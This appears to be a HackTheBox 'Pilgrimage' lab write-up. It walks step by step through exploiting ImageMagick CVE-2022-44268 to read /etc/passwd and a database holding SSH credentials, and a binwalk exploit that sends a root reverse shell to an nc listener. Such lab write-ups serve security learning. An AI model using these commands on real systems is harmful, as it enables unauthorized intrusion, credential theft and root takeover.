<h2>Target: 10.129.238.141  Pilgrimage </h2>
<b>Initiial Access:</b><br>
Step 1: nmap -Pn 10.129.238.141 --min-rate=5000 -p-|grep open|awk -F '/' '{print $1}'|tr '\n' ',' <br>
Nmap returns open ports 22 and 80 <br><br>

Step 2: Enumerate these open ports further with nmap: nmap -Pn 10.129.238.141 --min-rate=5000 -p 22,80 -sC -sV -oN nmap-pilgrimage

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/0e531d21-1efe-44ab-940e-7d522a5e1e84) 
 
Nmap shows port 80 tries to redirect to http://pilgrimage.htb.  Add this into the file /etc/hosts: 10.129.238.141 pilgrimage.htb

Now that the redirect should work, run the above nmap again to check if we get any extra information:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/ccc16fbc-612b-489d-b315-6d6b5f5653d2) 
 
Nmap shows that port 80 has a git repository.  

Step 3: Visiting port 80 shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/e8c621b6-d0cf-4a63-bae3-2dea77c23455) 

The page shows a function for uploading files. Spending some time navigating the page and trying different attacks led nowhere.  

Step 4: Dump the git repository to our local pc using gitdumper.sh (download from https://github.com/internetwache/GitTools/tree/master): gitdumper.sh http://pilgrimage.htb/.git/   /tmp

Step 5: Check contents of the dumped git repository on our local pc: git log

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/8b6f1c96-d5f3-4da0-8be2-6b576ab241ce) 
 
This reveals a username of ‘emily’ and a commit of e1a40beebc7035212efdcb15476f9c994e3634a7.

Step 6: Check the contents of the commit: git checkout e1a40beebc7035212efdcb15476f9c994e3634a7

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/f45a4585-fc76-49a1-bf4b-2295a85fcb63) 

The commit shows a lot of files.  

Step 7: Check the ‘magick’ file: git checkout magick

Check the type of file for ‘magick’:  file magick

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/bf4fd9b4-5d12-4c9c-9cec-87d75a3f5a88) 
 
This shows that ‘magick’ is an executable file.

Step 8: Google search ‘magick executable’: 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/b10b9767-994c-44ea-9772-328ccf3203d4) 
 
Google shows it’s “ImageMagick” which is used for editing images.  

Step 9: Check for known exploits for ‘magick’: searchsploit magick

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/6ae07a7a-fefe-4aeb-84f0-564e128d92a2)

Searchsploit shows a number of known vulnerabilities for different versions.  

Step 10: Check what version the target is using: ./magick --version 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/e86cde1c-d43b-4065-bb59-57f352bbd538) 

The target is using version 7.1.0-49.  Looking back at our searchsploit results we see this version is vulnerable to an ‘Arbitrary File Read’.  Download this exploit: searchsploit -m php/webapps/51261.txt.

Step 11: Opening the exploit we downloaded from searchsploit shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/c850d839-141f-4f19-a354-3f7a0c48db5a)

Go to the PoC listed and download it: https://github.com/voidz0r/CVE-2022-44268 

Step 12: Follow the instruction in the PoC to get arbitrary file read.

A. Create the malicious image and give it the file we want to read: cargo run "/etc/passwd"

B. Go to the site on port 80 and upload the malicious image we created.  After uploading the malicious image, the page gives a url (found at the bottom of the page) where we can find the image we uploaded:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/b4265d8d-67fa-4224-aa2f-de451bed4b2b)

C. Download the image we uploaded (649c53107f1f8.png) using the url given: wget http://pilgrimage.htb/shrunk/649c53107f1f8.png

D. On our local pc run the command: identify -verbose 649c53107f1f8.png

The command output shows: 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/3a0ada37-4678-469c-8f58-81a84ca3d7fe) 

E. Decode the hexadecimal part of the output using: python3 -c 'print(bytes.fromhex("paste-hexoutput-here”)'
 
![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/302e4b51-ba51-4fcb-b859-31b3e7d9d4a9)
 
The decoded hexadecimal shows the contents of /etc/passwd.  

Step 12: Now that we have a way to read files on the target, we will look for a file on the target that will help us further exploit the target.  Earlier we checked a commit in the git repository and found many different files.  Checkout the file ‘register.php’ from the git repository: git checkout register.php  

Read the file ‘register.php’: cat register.php
 
![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/0a2253b3-bd47-4a92-9c9b-aebcabda7a1d)
 
This shows a file of /var/db/pilgrimage.  Let’s read that file.
 
Step 13: Repeat previous step 11A-E to read the file /var/db/pilgrimage.  Looking through the decoded hexadecimal output for /var/db/pilgrimage shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/458512a1-1855-4d9c-8de7-2405fd3d22c5)

We find credentials.  Username ‘emily’ and password ‘abigchonkyboi123’.

Step 14: Try to login with ssh using the found credentials: ssh emily@pilgrimage.htb → enter the password when prompted.

It works, we have shell as emily.
__________________________________________________________________
<b>Privilege Escalation:</b><br>
Step 1: Upload pspy to the target.  Using pspy, check for running processes in the background that are running as root: ./pspy

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/e1b202a7-0e73-4ee3-bd36-23f1488c43b1)
   
Pspy shows malwarescan.sh running as root.

Step 2:  Read the file /usr/sbin/malwarescan.sh:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/670fbbb8-9e5a-4ac3-a2ce-9a7a650f25cf)

The file malwarescan.sh uses ‘binwalk’.

Step 3: Check if binwalk has any known vulnerabilities: searchsploit binwalk

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/0e66ce40-8efc-47bc-8d5d-edd7788ff851)
 
Searchsploit finds a vulnerability for binwalk.  Check on the target what version of binwalk is being used: /usr/local/bin/binwalk

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/a68cd925-8945-4b6a-b5ff-99611849b05c)
  
The target has the vulnerable version: 2.3.2

Step 4: Download the exploit on our local pc: searchsploit -m python/remote/51249.py

Create the malicious file ‘binwalk_exploit.png’ by running this exploit: python 51249.py anyfile.jpeg your-ip any-port: 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/5d8620e1-6932-40cf-a342-8e978a40e053) 

Step 5: Upload the malicious file ‘binwalk_exploit.png’ to the target shell.  

On our local pc, open a netcat listener: nc -lvnp \<enter-same-port-number-used-for-malicious-file\>

Step 6: On the target shell, run the malicious file with binwalk: binwalk -e binwalk_exploit.png

Our netcat listener got a shell as root.  We can get the flag in /root/root.txt
